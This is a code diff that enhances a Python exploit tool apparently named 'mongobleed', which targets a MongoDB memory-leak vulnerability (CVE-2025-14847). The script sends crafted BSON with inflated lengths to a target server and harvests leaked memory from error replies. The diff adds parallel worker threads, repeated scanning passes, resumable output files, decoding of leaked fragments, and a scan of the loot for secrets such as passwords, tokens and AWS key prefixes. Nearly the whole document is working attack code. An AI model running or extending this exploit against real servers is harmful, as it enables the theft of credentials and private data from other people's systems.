@@ -9,13 +9,27 @@ Technique: Craft BSON with inflated doc_len, server reads field names from
 leaked memory until null byte.
 """
 
+import argparse
+import base64
+import codecs
+import concurrent.futures
+import datetime
+import os
+import re
 import socket
 import struct
 import zlib
-import re
-import argparse
 
-def send_probe(host, port, doc_len, buffer_size):
+from rich.console import Console
+from urllib.parse import unquote_to_bytes
+
+FIELD_NAME_RE = re.compile(rb"field name '([^']*)'")
+TYPE_RE = re.compile(rb"type (\d+)")
+URL_ENC_RE = re.compile(r"%[0-9A-Fa-f]{2}")
+UNICODE_ESC_RE = re.compile(r"\\u[0-9A-Fa-f]{4}|\\x[0-9A-Fa-f]{2}")
+BASE64_RE = re.compile(r"^[A-Za-z0-9+/]+={0,2}$")
+
+def send_probe(host, port, doc_len, buffer_size, timeout):
     """Send crafted BSON with inflated document length"""
     # Minimal BSON content - we lie about total length
     content = b'\x10a\x00\x01\x00\x00\x00'  # int32 a=1
@@ -35,7 +49,7 @@ def send_probe(host, port, doc_len, buffer_size):
     
     try:
         sock = socket.socket()
-        sock.settimeout(2)
+        sock.settimeout(timeout)
         sock.connect((host, port))
         sock.sendall(header + payload)
         
@@ -67,13 +81,13 @@ def extract_leaks(response):
     leaks = []
     
     # Field names from BSON errors
-    for match in re.finditer(rb"field name '([^']*)'", raw):
+    for match in FIELD_NAME_RE.finditer(raw):
         data = match.group(1)
         if data and data not in [b'?', b'a', b'$db', b'ping']:
             leaks.append(data)
     
     # Type bytes from unrecognized type errors
-    for match in re.finditer(rb"type (\d+)", raw):
+    for match in TYPE_RE.finditer(raw):
         leaks.append(bytes([int(match.group(1)) & 0xFF]))
     
     return leaks
@@ -84,46 +98,160 @@ def main():
     parser.add_argument('--port', type=int, default=27017, help='Target port')
     parser.add_argument('--min-offset', type=int, default=20, help='Min doc length')
     parser.add_argument('--max-offset', type=int, default=8192, help='Max doc length')
-    parser.add_argument('--output', default='leaked.bin', help='Output file')
+    parser.add_argument('--buffer-bump', type=int, default=500, help='Extra bytes for claimed buffer size')
+    parser.add_argument('--timeout', type=float, default=2.0, help='Socket timeout in seconds')
+    parser.add_argument('--workers', type=int, default=max(4, (os.cpu_count() or 4) * 10), help='Thread count')
+    parser.add_argument('--preview-bytes', type=int, default=80, help='Bytes to show in console preview')
+    parser.add_argument('--max-empty-passes', type=int, default=1, help='Stop after N passes with no new leaks')
+    parser.add_argument('--loop', action='store_true', help='Keep looping until stopped')
+    parser.add_argument('--decode', action='store_true', help='Try to decode URL, unicode escapes, and base64')
+    parser.add_argument('--output', default=None, help='Output file (default: auto-generated)')
     args = parser.parse_args()
+
+    console = Console()
+
+    def ascii_preview(data, limit):
+        view = data[:limit]
+        out = []
+        for b in view:
+            if 32 <= b <= 126 and b not in (92,):
+                out.append(chr(b))
+            elif b == 92:
+                out.append(r"\\")
+            elif b == 9:
+                out.append(r"\t")
+            elif b == 10:
+                out.append(r"\n")
+            elif b == 13:
+                out.append(r"\r")
+            else:
+                out.append(f"\\x{b:02x}")
+        return "".join(out)
+
+    def truncate_text(text, limit):
+        if len(text) <= limit:
+            return text
+        return text[:limit] + "…"
+
+    def is_mostly_printable(text):
+        if not text:
+            return False
+        printable = sum(1 for ch in text if ch.isprintable())
+        return (printable / len(text)) >= 0.7
+
+    def decode_variants(data, limit):
+        variants = []
+        ascii_text = data.decode("ascii", errors="ignore")
+
+        if URL_ENC_RE.search(ascii_text):
+            try:
+                decoded_bytes = unquote_to_bytes(ascii_text)
+                decoded_text = decoded_bytes.decode("utf-8", errors="replace")
+                if is_mostly_printable(decoded_text):
+                    variants.append("url:" + truncate_text(decoded_text, limit))
+            except Exception:
+                pass
+
+        if UNICODE_ESC_RE.search(ascii_text):
+            try:
+                decoded_text = codecs.decode(ascii_text, "unicode_escape")
+                if is_mostly_printable(decoded_text):
+                    variants.append("unicode:" + truncate_text(decoded_text, limit))
+            except Exception:
+                pass
+
+        b64_candidate = ascii_text.strip()
+        if len(b64_candidate) >= 12 and len(b64_candidate) % 4 == 0 and BASE64_RE.match(b64_candidate):
+            try:
+                decoded_bytes = base64.b64decode(b64_candidate, validate=True)
+                decoded_text = decoded_bytes.decode("utf-8", errors="replace")
+                if is_mostly_printable(decoded_text):
+                    variants.append("b64:" + truncate_text(decoded_text, limit))
+            except Exception:
+                pass
+
+        return variants
+
+    if not args.output:
+        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+        safe_host = re.sub(r"[^A-Za-z0-9._-]+", "_", args.host)
+        args.output = f"leaked_{safe_host}_{args.port}_{ts}.bin"
+
+    console.print("[bold cyan][*][/bold cyan] mongobleed - CVE-2025-14847 MongoDB Memory Leak")
+    console.print("[bold cyan][*][/bold cyan] Author: Joe Desimone - x.com/dez_")
+    console.print(f"[bold cyan][*][/bold cyan] Target: {args.host}:{args.port}")
+    console.print(f"[bold cyan][*][/bold cyan] Scanning offsets {args.min_offset}-{args.max_offset}")
+    console.print(f"[bold cyan][*][/bold cyan] Workers: {args.workers}")
+    console.print(f"[bold cyan][*][/bold cyan] Output: {args.output}")
+    console.print("")
     
-    print(f"[*] mongobleed - CVE-2025-14847 MongoDB Memory Leak")
-    print(f"[*] Author: Joe Desimone - x.com/dez_")
-    print(f"[*] Target: {args.host}:{args.port}")
-    print(f"[*] Scanning offsets {args.min_offset}-{args.max_offset}")
-    print()
-    
-    all_leaked = bytearray()
+    unique_fragments = []
     unique_leaks = set()
+    if os.path.exists(args.output):
+        with open(args.output, 'rb') as f:
+            all_leaked = f.read()
+    else:
+        all_leaked = b""
+    out_fh = open(args.output, 'ab')
     
-    for doc_len in range(args.min_offset, args.max_offset):
-        response = send_probe(args.host, args.port, doc_len, doc_len + 500)
-        leaks = extract_leaks(response)
-        
-        for data in leaks:
-            if data not in unique_leaks:
-                unique_leaks.add(data)
-                all_leaked.extend(data)
-                
-                # Show interesting leaks (> 10 bytes)
-                if len(data) > 10:
-                    preview = data[:80].decode('utf-8', errors='replace')
-                    print(f"[+] offset={doc_len:4d} len={len(data):4d}: {preview}")
-    
-    # Save results
-    with open(args.output, 'wb') as f:
-        f.write(all_leaked)
-    
-    print()
-    print(f"[*] Total leaked: {len(all_leaked)} bytes")
-    print(f"[*] Unique fragments: {len(unique_leaks)}")
-    print(f"[*] Saved to: {args.output}")
+    def worker(doc_len):
+        response = send_probe(
+            args.host,
+            args.port,
+            doc_len,
+            doc_len + args.buffer_bump,
+            args.timeout,
+        )
+        return doc_len, extract_leaks(response)
+
+    empty_passes = 0
+    pass_num = 0
+    while True:
+        pass_num += 1
+        new_in_pass = 0
+        with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as executor:
+            futures = [executor.submit(worker, doc_len) for doc_len in range(args.min_offset, args.max_offset)]
+            for future in concurrent.futures.as_completed(futures):
+                doc_len, leaks = future.result()
+                for data in leaks:
+                    if data not in unique_leaks and data not in all_leaked:
+                        unique_leaks.add(data)
+                        unique_fragments.append(data)
+                        out_fh.write(data)
+                        all_leaked += data
+                        new_in_pass += 1
+
+                        # Show interesting leaks (> 10 bytes)
+                        if len(data) > 10:
+                            preview = ascii_preview(data, args.preview_bytes)
+                            if args.decode:
+                                variants = decode_variants(data, args.preview_bytes * 2)
+                                if variants:
+                                    preview = " | ".join(variants)
+                            console.print(f"[green][+][/green] offset={doc_len:4d} len={len(data):4d}: {preview}")
+        if args.loop:
+            console.print(f"[bold cyan][*][/bold cyan] Pass {pass_num} complete, new fragments: {new_in_pass}")
+            continue
+
+        if new_in_pass == 0:
+            empty_passes += 1
+        else:
+            empty_passes = 0
+        console.print(f"[bold cyan][*][/bold cyan] Pass {pass_num} complete, new fragments: {new_in_pass}")
+        if empty_passes >= args.max_empty_passes:
+            break
+
+    out_fh.close()
+    console.print("")
+    console.print(f"[bold cyan][*][/bold cyan] Total leaked: {len(all_leaked)} bytes")
+    console.print(f"[bold cyan][*][/bold cyan] Unique fragments (this run): {len(unique_leaks)}")
+    console.print(f"[bold cyan][*][/bold cyan] Saved to: {args.output}")
     
     # Show any secrets found
     secrets = [b'password', b'secret', b'key', b'token', b'admin', b'AKIA']
     for s in secrets:
         if s.lower() in all_leaked.lower():
-            print(f"[!] Found pattern: {s.decode()}")
+            console.print(f"[bold red][!][/bold red] Found pattern: {s.decode()}")
 
 if __name__ == '__main__':
     main()
